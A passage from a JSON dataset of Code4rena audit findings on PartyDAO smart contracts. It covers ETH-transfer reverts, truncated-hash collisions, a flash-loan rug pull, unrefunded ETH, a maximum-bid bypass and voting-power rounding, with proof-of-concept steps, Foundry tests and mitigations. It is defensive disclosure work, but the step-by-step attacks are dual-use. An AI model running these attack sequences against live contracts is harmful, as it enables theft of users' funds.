}\n```\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388>\n\n```solidity\n    function _transfer(\n        TokenType tokenType,\n        address token,\n        address payable recipient,\n        uint256 amount\n    )\n        private\n    {\n        bytes32 balanceId = _getBalanceId(tokenType, token);\n        // Reduce stored token balance.\n        _storedBalances[balanceId] -= amount;\n        if (tokenType == TokenType.Native) {\n            recipient.transferEth(amount);\n        } else {\n            assert(tokenType == TokenType.Erc20);\n            IERC20(token).compatTransfer(recipient, amount);\n        }\n    }\n```\n\n### Proof of Concept\n\nPlease add the following `error` and append the test in `sol-tests\\crowdfund\\BuyCrowdfund.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    error EthTransferFailed(address receiver, bytes errData);\n\n    function testContributorContractFailsToReceiveETH() public {\n        uint256 tokenId = erc721Vault.mint();\n        BuyCrowdfund pb = _createCrowdfund(tokenId, 0);\n\n        // This contract is used to simulate a contract that does not implement the receive or fallback function for the purpose of receiving ETH.\n        address payable contributorContract = payable(address(this));\n        vm.deal(contributorContract, 1e18);\n\n        address delegate = _randomAddress();\n\n        // contributorContract contributes 1e18.\n        vm.prank(contributorContract);\n        pb.contribute{ value: 1e18 }(delegate, \"\");\n\n        // The price of the NFT of interest is 0.5e18.\n        Party party_ = pb.buy(\n            payable(address(erc721Vault)),\n            0.5e18,\n            abi.encodeCall(erc721Vault.claim, (tokenId)),\n            defaultGovernanceOpts\n        );\n\n        // After calling the buy function, the party is created with the NFT.\n        assertEq(address(party), address(party_));\n        assertTrue(pb.getCrowdfundLifecycle() == Crowdfund.CrowdfundLifecycle.Won);\n        assertEq(pb.settledPrice(), 0.5e18);\n        assertEq(pb.totalContributions(), 1e18);\n        assertEq(address(pb).balance, 1e18 - 0.5e18);\n\n        // Calling the burn function reverts because contributorContract cannot receive ETH through the receive or fallback function\n        vm.expectRevert(abi.encodeWithSelector(\n            EthTransferFailed.selector,\n            contributorContract,\n            \"\"\n        ));\n        pb.burn(contributorContract);\n\n        // contributorContract does not receive 0.5e18 back from the BuyCrowdfund contract.\n        assertEq(contributorContract.balance, 0);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen calling the `transferEth` function, if the receiver contract is unable to receive ETH through its `receive` or `fallback` function, WETH can be used to deposit the corresponding ETH amount, and the deposited amount can be transferred to the receiver contract.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/212#issuecomment-1255144719):**\n > We will mitigate this by escrowing the ETH refund and/or the governance NFT to be claimed by the contributor later (possibly to a different address) if either transfer fails.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/212#issuecomment-1264675601):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/126\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/212#issuecomment-1268532848):**\n > A contract contributor may revert on `burn`, preventing full voting power distribution. Agree with Medium risk.\n\n\n\n***\n\n",
      "summary": "\nThe report is about a bug found in the PartyDAO contract code by several individuals. The bug can potentially cause problems with transferring ETH to contracts, which could result in the loss of voting power and contribution refunds for the affected contracts. The bug is located in three specific functions and can be mitigated by using WETH to deposit the ETH amount and then transferring it to the contract. The bug has been resolved by the PartyDAO team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/212",
      "tags": [],
      "finders": []
    },
    {
      "id": "42831",
      "title": "[M-03] Only part of `keccak256()` is used as hash, making it susceptible to collision attacks",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xA5DF, also found by Lambda and V\\_B_\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L275>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L325>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L26>\n\n### Vulnerability Details\n\nAt 2 places in the code only part of the output of `keccak256()` is used as the hash:\n\n*   At `TokenDistributor` - `DistributionState.distributionHash15` - uses only a 15 bytes as a hash\n    *   This one is intended to save storage\n*   At `Crowdfund.governanceOptsHash` a 16 bytes is used as hash\n    *   This one has no benefit at all as it doesn't save on storage\n\n15/16 bytes hash is already not very high to begin with (as explained below). On top of that, using a non standard hash can be unsafe. Since diverging from the standard can break things.\n\n### Impact\n\nFor the `FixedGovernanceOpts` an attacker can create a legitimate party, and then when running `buy()` use the malicious hash to:\n\n*   include himself in the hosts (DoS-ing the party by vetoing every vote)\n*   reduce the `passThresholdBps` (allowing him to pass any vote, including sending funds from the Party)\n*   Setting himself as `feeRecipient` and increasing the fee\n\nFor the `DistributionInfo` struct - an attacker can easily drain all funds from the token distribution contract, by using the legitimate hash to create a distribution with a malicious ERC20 token (and a malicious party contract), and then using the malicious hash to claim assets of a legitimate token.\n\n### Proof of Concept\n\n#### The attack\n\nUsing the birthday attack, for a 50% chance with a 15 bytes hash, the number of hashes needed to generate is 1.4e18 (`(ln(1/0.5) *2) ** 0.5 * (2 ** 60)`).\n\n*   For 16 bytes that would be 2.2e19\n\nAn attacker can create 2 different structs, a legitimate and a malicious one, while modifying at each iteration only the last bits\n\n*   For the `FixedGovernanceOpts` the last bits would be the `feeRecipient` field\n*   For the `DistributionInfo` struct that would be the `fee` field (and then exploit it via the `claim()` function which doesn't validate the `fee` field)\n\nThe attacker will than generate half of the hashes from the malicious one, and half from the legitimate ones, so in case of a collision there's a 50% chance it'd be between the legitimate and malicious struct.\n\n#### CPU\n\n*   In the `DistributionInfo` we have 224 bytes (and for `FixedGovernanceOpts` 192 bytes if we precalculate the hosts hash)\n\n*   A computer needs about 11 cycles per byte\n\n*   An avg home PC can do \\~3e9 cycles per seconds\n\n*   There are \\~8.6e4 seconds a day\n\n*   Putting it all together `1.4e18 * 11 * 224 / (3e9*8.6e4)` = \\~1.3e8\n\n*   Note that we can further optimize it (by 10 times at least), since we're using the same input and only modifying the last bits every time (the `fee` field)\n\n#### Storage\n\n32 &ast; 1.4e18 = \\~4.5e19 bytes is needed, while an affordable drive can be 8TB=\\~8e12 bytes.\nThat puts it about 5e6 times away from and affordable attack.\n\n#### Overall Risk\n\nThe calculations above are for basic equipment, an attacker can be spending more on equipment to get closer (I'd say you can easily multiply that by 100 for a medium size attacker + running the computations for more than one day).\nCombining that with the fact that a non-standard hash is used, and that in general hashes can have small vulnerabilities that lower a bit their strength - I'd argue it's not very safe to be \\~1e4 (for a medium size attacker; \\~1.5e5 for 16 bytes) away from a practical attack.\n\n### Recommended Mitigation Steps\n\nUse the standard, 32-bytes, output of `keccak256()`.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/231#issuecomment-1255266728):**\n > At first we dismissed this as being really impractical but the more we thought of what an attack would actually look like, the more practical (if still improbable) it would be. We will extend both hashes to full-width (32 bytes).\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/231#issuecomment-1262839129):**\n > Agree with Medium risk. This attack seems unlikely but may be within the realm of possible when high value is at stake.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/231#issuecomment-1264680753):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/138\n\n\n\n***\n\n",
      "summary": "\nThe report discusses a vulnerability in the code of a project called PartyDAO. The vulnerability involves using only a portion of the output of a function called `keccak256()`, which is used to generate a unique identifier for data. This can potentially allow an attacker to manipulate the code and cause harm to the project. The report suggests using the full output of `keccak256()` instead of a partial output to mitigate this vulnerability. The project has confirmed the vulnerability and has taken steps to address it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/231",
      "tags": [],
      "finders": []
    },
    {
      "id": "42830",
      "title": "[M-01] Attacker can list an NFT they own and inflate to zero all users' contributions, keeping the NFT and all the money",
      "impact": "MEDIUM",
      "content": "_Submitted by Trust, also found by smiling\\_heretic_\n\nCrowdfunds split the voting power and distribution of profits rights according to the percentage used to purchase the NFT. When an attacker lists his own NFT for sale and contributes to it, any sum he contributes will return to him once the sell is executed. This behavior is fine so long as the sell price is fair, as other contributors will receive a fair portion of voting power and equity.  Therefore, when a maximum price is defined, it is not considered a vulnerability that an attacker can contribute `maximumPrice - totalContributions` and take a potentially large stake of the Crowdfund, as user's have contributed knowing the potential maximum price.\n\nHowever, when maximum price is zero, which is allowed in BuyCrowdfund and CollectionBuyCrowdfund, the lister of the NFT can always steal the entirety of the fund and keep the NFT. Attacker can send a massive contribution, buy the NFT and pass a unanimous proposal to approve the NFT to his wallet. Attacker can use a flash loan to finance the initial contribution, which is easily paid back from the NFT lister wallet.\n\nIt is important to note that there is no way for the system to know if the Crowdfund creator and the NFT owner are the same entity, and therefore it is critical for the platform to defend users against this scenario.\n\n### Impact\n\nAny crowdfund with zero maximumPrice configured is subject to NFT lister rug pull and complete takeover of the contribution funds.\n\n### Proof of Concept\n\n1.  Suppose totalContributions=X. Attacker will prepare flashloan callback which does:\n    *   `contribute()` with the borrowed funds\n    *   call BuyCrowdfund's `buy()` with a contract that will purchase the NFT using the large sum\n    *   call NFT lister contract's sendProfit() function which will send attacker the NFT sell amount\n    *   pay back the flash loan\n2.  Attacker will call flashloan(10,000X) to buy his own NFT and take unanimous holding of created party\n3.  Attacker will create ArbitraryCallsProposal with a single call to token.approve(ATTACKER, token_id). It is immediately ready for execution because attacker has > 99.99% of votes. Precious approve() is allowed in unanimous proposals.\n4.  Attacker calls NFT's `transferFrom()` to take back control of the NFT, leaving with the Crowdfund's contribution and the listed NFT.\n\n### Recommended Mitigation Steps\n\nDisable the option to have unlimited maximumPrice for BuyCrowdfund and CollectionBuyCrowdfund contracts. AuctionCrowdfund is already safe by not allowing a zero maximumBid.\n\n\n**[merklejerk (PartyDAO) commented](https://github.com/code-423n4/2022-09-party-findings/issues/213#issuecomment-1254016870):**\n > Duplicate of [#17](https://github.com/code-423n4/2022-09-party-findings/issues/17) \n\n**[HardlyDifficult (judge) decreased severity to QA and commented](https://github.com/code-423n4/2022-09-party-findings/issues/213#issuecomment-1272553754):**\n > See dupe for context. Merging with [#198](https://github.com/code-423n4/2022-09-party-findings/issues/198).\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-09-party-findings/issues/213#issuecomment-1274201301):**\n > TBH I don't see enough resemblance to #17 for it to be dupped. This submission discusses specifically maximumPrice = 0 which allows attacker to always claim the entire contribution pool to themselves. Would appreciate a second look.\n> @HardlyDifficult \n> disclaimer - this is my submission.\n\n**[HardlyDifficult (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-09-party-findings/issues/213#issuecomment-1274662744):**\n> Yes that is fair. This seems to fall under the known issue \"It is possible that someone could manipulate parties by contributing ETH and then buying their NFT that they own.\" - although an extreme example and a unique take on that scenario. However given the apparent ease and impact of this attack it seems we can bump this to Medium risk - would be high if not for the general known issue here.\n\n**[smiling\\_heretic (warden) commented](https://github.com/code-423n4/2022-09-party-findings/issues/213#issuecomment-1275265841):**\n > The same is true for [206](https://github.com/code-423n4/2022-09-party-findings/issues/206) (disclaimer: it's my submission) so I think it should be marked as duplicate of this finding and also upgraded to medium. \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/213#issuecomment-1275269089):**\n > Agree, thanks @SmilingHeretic.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in Crowdfunds, where an attacker can contribute a large sum of money to buy their own NFT and take control of the contribution funds. This is possible when the maximum price for the NFT is set to zero, which is allowed in certain contracts. The attacker can use a flash loan to finance the initial contribution and then pass a unanimous proposal to approve the NFT to their wallet. This allows them to take back control of the NFT and the contribution funds. The impact of this vulnerability is that any crowdfund with a zero maximum price is at risk of a rug pull by the NFT lister. To mitigate this issue, it is recommended to disable the option for a zero maximum price in certain contracts. This vulnerability has been identified by multiple individuals and has been classified as a medium risk. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/213",
      "tags": [],
      "finders": []
    },
    {
      "id": "3320",
      "title": "[M-12] Excess eth is not refunded",
      "impact": "MEDIUM",
      "content": "_Submitted by csanuragjain_\n\nThe ArbitraryCallsProposal contract requires sender to provide eth(msg.value) for each call. Now if user has provided more eth than combined call.value then this excess eth is not refunded back to user.\n\n### Proof of Concept\n\n1.  Observe the [\\_executeArbitraryCalls function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L37)\n\n<!---->\n\n    function _executeArbitraryCalls(\n            IProposalExecutionEngine.ExecuteProposalParams memory params\n        )\n            internal\n            returns (bytes memory nextProgressData)\n        {\n\n    ...\n    uint256 ethAvailable = msg.value;\n            for (uint256 i = 0; i < calls.length; ++i) {\n                // Execute an arbitrary call.\n                _executeSingleArbitraryCall(\n                    i,\n                    calls[i],\n                    params.preciousTokens,\n                    params.preciousTokenIds,\n                    isUnanimous,\n                    ethAvailable\n                );\n                // Update the amount of ETH available for the subsequent calls.\n                ethAvailable -= calls[i].value;\n                emit ArbitraryCallExecuted(params.proposalId, i, calls.length);\n            }\n    ....\n    }\n\n2.  As we can see user provided msg.value is deducted with each calls\\[i].value\n3.  Assume user provided 5 amount as msg.value and made a single call with calls\\[0].value as 4\n4.  This means after calls have been completed ethAvailable will become 5-4=1\n5.  Ideally this 1 eth should be refunded back to user but there is no provision for same and the fund will remain in contract\n\n### Recommended Mitigation Steps\n\nAt the end of `\\_executeArbitraryCalls` function, refund the remaining ethAvailable back to the user.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/186#issuecomment-1255157023):**\n > Will refund unused ETH at the end of executing arbitrary calls.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/186#issuecomment-1264679434):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/135\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/186#issuecomment-1269951162):**\n > This is a form of leaking value - agree with Medium risk.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the ArbitraryCallsProposal contract, which is part of the PartyDAO/party-contracts-c4 project on GitHub. This vulnerability allows users to send more ETH than the combined value of the calls they make, and the excess ETH is not refunded back to them. \n\nThe proof of concept for this vulnerability begins by observing the _executeArbitraryCalls function. This function deducts the user-provided msg.value with each calls[i].value. For example, if the user provides 5 ETH and makes a single call with a calls[0].value of 4 ETH, the remaining ETHAvailable would be 1 ETH, which should be refunded back to the user. However, there is no provision for this in the contract.\n\nThe recommended mitigation for this vulnerability is to add a provision at the end of the _executeArbitraryCalls function which refunds the remaining ethAvailable back to the user.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/186",
      "tags": [],
      "finders": [
        "csanuragjain"
      ]
    },
    {
      "id": "3319",
      "title": "[M-11] Maximum bid will always be used in Auction",
      "impact": "MEDIUM",
      "content": "_Submitted by csanuragjain, also found by Lambda_\n\nAuctionCrowdfund contract is designed in a way to allow bidding max upto maximumBid. But due to a flaw, anyone (including NFT seller) can make sure that CrowdFund bid always remain equal to maximumBid thus removing the purpose of maximumBid. This also causes loss to Party participating in this Auction as the auction will always end up with maximumBid even when it could have stopped with lower bid as shown in POC.\n\n### Proof of Concept\n\n1.  An auction is started for NFT N in the market\n2.  Party Users P1 starts an AuctionCrowdfund with maximumBid as 100 for this auction.\n\n<!---->\n\n    function initialize(AuctionCrowdfundOptions memory opts)\n            external\n            payable\n            onlyConstructor\n        {\n    ...\n    maximumBid = opts.maximumBid;\n    ...\n    }\n\n3.  P1 bids amount 10 for the NFT N using [bid function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149)\n4.  Some bad news arrives for the NFT collection including NFT N reducing its price\n5.  P1 decides not to bid more than amount 10 due to this news\n6.  NFT collection owner who is watching this AuctionCrowdfund observes that bidding is only 10 but Party users have maximumBid of 100\n7.  NFT collection owner  asks his friend to bid on this NFT in the auction market (different from crowd fund)\n8.  NFT collection owner now takes advantage of same and himself calls the bid function of AuctionCrowdfund via Proxy\n\n<!---->\n\n    function bid() external onlyDelegateCall {\n    ...\n    }\n\n9.  Now since last bid belongs to collection owner friend, so AuctionCrowdfund contract simply extends its bid further\n\n<!---->\n\n    if (market.getCurrentHighestBidder(auctionId_) == address(this)) {\n                revert AlreadyHighestBidderError();\n            }\n            // Get the minimum necessary bid to be the highest bidder.\n            uint96 bidAmount = market.getMinimumBid(auctionId_).safeCastUint256ToUint96();\n            // Make sure the bid is less than the maximum bid.\n            if (bidAmount > maximumBid) {\n                revert ExceedsMaximumBidError(bidAmount, maximumBid);\n            }\n            lastBid = bidAmount;\n\n10. NFT collection owner keeps repeating step 7-9 until AuctionCrowdfund reaches the final maximum bid of 100\n11. After auction completes, collection owner gets 100 amount instead of 10 even though crowd fund users never bidded for amount 100\n\n### Recommended Mitigation Steps\n\nmaximumbid concept can easily be bypassed as shown above and will not make sense. Either remove it completely\n\nOR\n\nbid function should only be callable via crowdfund members then attacker would be afraid if new bid will come or not and there should be a consensus between crowdfund members before bidding which will protect this scenario.\n\n**[merklejerk (PartyDAO) acknowledged and commented](https://github.com/code-423n4/2022-09-party-findings/issues/179#issuecomment-1255154999):**\n > While it doesn't solve it for all crowdfunds, we will allow some crowdfunds to restrict who can call their `bid()` function to host-only.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/179#issuecomment-1269948984):**\n > This is a form of leaking value - agree with Medium risk.\n\n**[0xble (PartyDAO) confirmed and resolved](https://github.com/code-423n4/2022-09-party-findings/issues/179#issuecomment-1276607530):**\n > Mitigated by: https://github.com/PartyDAO/partybidV2/pull/140\n\n\n\n***\n\n",
      "summary": "\nA vulnerability has been discovered in the AuctionCrowdfund contract, which is designed to allow bidding up to a maximumBid. However, due to a flaw, anyone (including the NFT seller) can make sure that the CrowdFund bid always remains equal to the maximumBid, thus removing the purpose of the maximumBid. This also causes a loss to the Party participating in the Auction, as the auction will always end up with the maximumBid, even when it could have stopped with a lower bid.\n\nProof of concept:\n1. An auction is started for an NFT.\n2. A Party User P1 starts an AuctionCrowdfund with a maximumBid of 100.\n3. P1 bids 10 for the NFT.\n4. Bad news arrives that reduces the NFT's price.\n5. P1 decides not to bid more than 10.\n6. The NFT collection owner, who is watching the AuctionCrowdfund, notices that the bidding is only 10, but the Party users have a maximumBid of 100.\n7. The NFT collection owner asks a friend to bid on the NFT in the auction market.\n8. The NFT collection owner calls the bid function of the AuctionCrowdfund via a proxy.\n9. Since the last bid belongs to the collection owner's friend, the AuctionCrowdfund contract extends its bid further.\n10. The NFT collection owner keeps repeating steps 7-9 until the AuctionCrowdfund reaches the final maximum bid of 100.\n11. After the auction completes, the collection owner gets 100 instead of 10, even though the crowdfund users never bid for 100.\n\nThe maximumBid concept can be easily bypassed as shown above and will not make sense. To mitigate this issue, either the maximumBid should be removed completely, or the bid function should only be callable by the crowdfund members. This would make the attacker uncertain if a new bid will come or not and would require a consensus between the crowdfund members before bidding, which would protect this scenario.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/179",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Lambda"
      ]
    },
    {
      "id": "3318",
      "title": "[M-10] Possible that unanimous votes is unachievable",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda, also found by CertoraInc_\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L370>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L1066>\n\n### Impact\n\nCurrently, the `votingPower` calculation rounds down for every user except the `splitRecipient`. This can cause situations where 99.99% of votes (i.e., an unanimous vote) are not achieved, even if all vote in favor of a proposal. This can be very bad for a party, as certain proposals (transferring precious tokens out) require an unanimous vote and are therefore not executable.\n\n### Proof Of Concept\n\nLet's say for the sake of simplicity that 100 persons contribute 2 wei and `splitBps` is 10 (1%). `votingPower` for all users that contributed will be 1 and 2 for the `splitRecipient`, meaning the maximum achievable vote percentage is 102 / 200 = 51%.\n\nOf course, this is an extreme example, but it shows that the current calculation can introduce siginificant rounding errors that impact the functionality of the protocol.\n\n### Recommended Mitigation Steps\n\nInstead of requiring more than 99.99% of the votes, ensure that the individual votingPower sum to the total contribution. For instance, one user (e.g., the last one to claim) could receive all the remaining votingPower, which would require a running sum of the already claimed votingPower.\n\n**[merklejerk (PartyDAO) acknowledged and commented](https://github.com/code-423n4/2022-09-party-findings/issues/114#issuecomment-1254203278):**\n > We consider it highly unlikely that an NFT would be crowdfunded for dust amounts so we don't think this would actually occur in the wild.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/114#issuecomment-1268541357):**\n > Rounding error could prevent unanimous votes.. agree with Medium risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the PartyDAO/party-contracts-c4 project. The vulnerability is related to the `votingPower` calculation, which rounds down the voting power of all users except the `splitRecipient`. This can cause situations where 99.99% of votes (i.e., an unanimous vote) are not achieved, even though all users vote in favor of a proposal. This is a problem because certain proposals require an unamimous vote and are therefore not executable.\n\nFor example, if 100 persons contribute 2 wei and `splitBps` is 10 (1%), the `votingPower` for all users that contributed will be 1 and 2 for the `splitRecipient`, meaning the maximum achievable vote percentage is 102 / 200 = 51%. This shows that the current calculation can introduce siginificant rounding errors that impact the functionality of the protocol.\n\nTo mitigate this problem, the code should be changed so that the individual votingPower sum to the total contribution. For instance, one user (e.g., the last one to claim) could receive all the remaining votingPower, which would require a running sum of the already claimed votingPower.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/114",
      "tags": [],
      "finders": [
        "CertoraInc",
        "Lambda"
      ]
    },
    {
      "id": "3317",
      "title": "[M-09] Calling transferEth function can revert if receiver input corresponds to a contract that is unable to receive ETH through its receive or fallback function",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15\nhttps://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489\nhttps://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388\n\n\n## Vulnerability details\n\n## Impact\nThe following `transferEth` function is called when calling the `_burn` or `_transfer` function below. If the `receiver` input for the `transferEth` function corresponds to a contract, it is possible that the receiver contract does not, intentionally or unintentionally, implement the `receive` or `fallback` function in a way that supports receiving ETH or that calling the receiver contract's `receive` or `fallback` function executes complicated logics that cost much gas, which could cause calling `transferEth` to revert. For example, when calling `transferEth` reverts, calling `_burn` also reverts; this means that the receiver contract would not be able to get the voting power and receive the extra contribution it made after the crowdfunding finishes; yet, the receiver contract deserves these voting power and contribution refund. Hence, the receiver contract loses valuables that it deserves, which is unfair to the users who controls it.\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15\n```solidity\n    function transferEth(address payable receiver, uint256 amount)\n        internal\n    {\n        (bool s, bytes memory r) = receiver.call{value: amount}(\"\");\n        if (!s) {\n            revert EthTransferFailed(receiver, r);\n        }\n    }\n```\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489\n```solidity\n    function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)\n        private\n    {\n        // If the CF has won, a party must have been created prior.\n        if (lc == CrowdfundLifecycle.Won) {\n            if (party_ == Party(payable(0))) {\n                revert NoPartyError();\n            }\n        } else if (lc != CrowdfundLifecycle.Lost) {\n            // Otherwise it must have lost.\n            revert WrongLifecycleError(lc);\n        }\n        // Split recipient can burn even if they don't have a token.\n        if (contributor == splitRecipient) {\n            if (_splitRecipientHasBurned) {\n                revert SplitRecipientAlreadyBurnedError();\n            }\n            _splitRecipientHasBurned = true;\n        }\n        // Revert if already burned or does not exist.\n        if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {\n            CrowdfundNFT._burn(contributor);\n        }\n        // Compute the contributions used and owed to the contributor, along\n        // with the voting power they'll have in the governance stage.\n        (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =\n            _getFinalContribution(contributor);\n        if (votingPower > 0) {\n            // Get the address to delegate voting power to. If null, delegate to self.\n            address delegate = delegationsByContributor[contributor];\n            if (delegate == address(0)) {\n                // Delegate can be unset for the split recipient if they never\n                // contribute. Self-delegate if this occurs.\n                delegate = contributor;\n            }\n            // Mint governance NFT for the contributor.\n            party_.mint(\n                contributor,\n                votingPower,\n                delegate\n            );\n        }\n        // Refund any ETH owed back to the contributor.\n        contributor.transferEth(ethOwed);\n        emit Burned(contributor, ethUsed, ethOwed, votingPower);\n    }\n```\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388\n```solidity\n    function _transfer(\n        TokenType tokenType,\n        address token,\n        address payable recipient,\n        uint256 amount\n    )\n        private\n    {\n        bytes32 balanceId = _getBalanceId(tokenType, token);\n        // Reduce stored token balance.\n        _storedBalances[balanceId] -= amount;\n        if (tokenType == TokenType.Native) {\n            recipient.transferEth(amount);\n        } else {\n            assert(tokenType == TokenType.Erc20);\n            IERC20(token).compatTransfer(recipient, amount);\n        }\n    }\n```\n\n## Proof of Concept\nPlease add the following `error` and append the test in `sol-tests\\crowdfund\\BuyCrowdfund.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    error EthTransferFailed(address receiver, bytes errData);\n\n    function testContributorContractFailsToReceiveETH() public {\n        uint256 tokenId = erc721Vault.mint();\n        BuyCrowdfund pb = _createCrowdfund(tokenId, 0);\n\n        // This contract is used to simulate a contract that does not implement the receive or fallback function for the purpose of receiving ETH.\n        address payable contributorContract = payable(address(this));\n        vm.deal(contributorContract, 1e18);\n\n        address delegate = _randomAddress();\n\n        // contributorContract contributes 1e18.\n        vm.prank(contributorContract);\n        pb.contribute{ value: 1e18 }(delegate, \"\");\n\n        // The price of the NFT of interest is 0.5e18.\n        Party party_ = pb.buy(\n            payable(address(erc721Vault)),\n            0.5e18,\n            abi.encodeCall(erc721Vault.claim, (tokenId)),\n            defaultGovernanceOpts\n        );\n\n        // After calling the buy function, the party is created with the NFT.\n        assertEq(address(party), address(party_));\n        assertTrue(pb.getCrowdfundLifecycle() == Crowdfund.CrowdfundLifecycle.Won);\n        assertEq(pb.settledPrice(), 0.5e18);\n        assertEq(pb.totalContributions(), 1e18);\n        assertEq(address(pb).balance, 1e18 - 0.5e18);\n\n        // Calling the burn function reverts because contributorContract cannot receive ETH through the receive or fallback function\n        vm.expectRevert(abi.encodeWithSelector(\n            EthTransferFailed.selector,\n            contributorContract,\n            \"\"\n        ));\n        pb.burn(contributorContract);\n\n        // contributorContract does not receive 0.5e18 back from the BuyCrowdfund contract.\n        assertEq(contributorContract.balance, 0);\n    }\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nWhen calling the `transferEth` function, if the receiver contract is unable to receive ETH through its `receive` or `fallback` function, WETH can be used to deposit the corresponding ETH amount, and the deposited amount can be transferred to the receiver contract.",
      "summary": "\nThis bug report is about a vulnerability in the PartyDAO smart contracts code. The code can be found on the GitHub repository, and the vulnerable lines of code are listed in the report. The vulnerability can cause a contract to not receive the voting power and contribution refund it deserves after the crowdfunding finishes. The proof of concept provided in the report demonstrates this scenario. The recommended mitigation step is to use WETH to deposit the corresponding ETH amount and transfer it to the receiver contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/212",
      "tags": [],
      "finders": [
        "CertoraInc",
        "tonisives",
        "Jeiwan",
        "rbserver"
      ]
    },
    {
      "id": "3316",
      "title": "[M-08] Early contributor can always become majority of crowdfund leading to rugging risks.",
      "impact": "MEDIUM",
